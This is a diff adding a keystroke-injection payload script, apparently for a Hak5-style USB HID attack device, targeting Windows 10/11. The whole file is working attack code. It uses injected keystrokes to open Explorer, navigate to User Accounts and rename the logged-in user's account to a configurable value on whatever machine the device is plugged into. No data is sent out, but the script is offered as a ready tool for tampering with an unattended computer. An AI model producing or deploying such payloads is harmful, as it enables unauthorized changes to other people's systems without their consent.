@@ -1,0 +1,57 @@
+#############################################
+#                                           #
+# Title        : Change Windows User Name   #
+# Author       : Aleff                      #
+# Version      : 1.0                        #
+# Category     : Execution                  #
+# Target       : Windows 10/11              #
+#                                           #
+#############################################
+
+ATTACKMODE HID
+
+# REQUIREMENTS
+#  - Nothing
+
+# Note:
+#  - Payload tested on Windows 11 Eng 
+
+# VARIABLES
+# Set the new name that you want to set
+NEW_NAME='example'
+
+# Open Windows research
+QUACK DELAY 2000
+QUACK GUI
+QUACK DELAY 1000
+
+# Search and opern explorer app
+QUACK STRING explorer
+QUACK ENTER
+QUACK DELAY 1000
+
+# Goto search bar and open User Accounts settings
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING Control Panel\All Control Panel Items\User Accounts
+QUACK ENTER
+QUACK DELAY 1500
+
+# Goto 'Change you account name'
+QUACK TAB
+QUACK DELAY 500
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING $NEW_NAME
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK ENTER
+QUACK DELAY 1000
+QUACK ALT F4
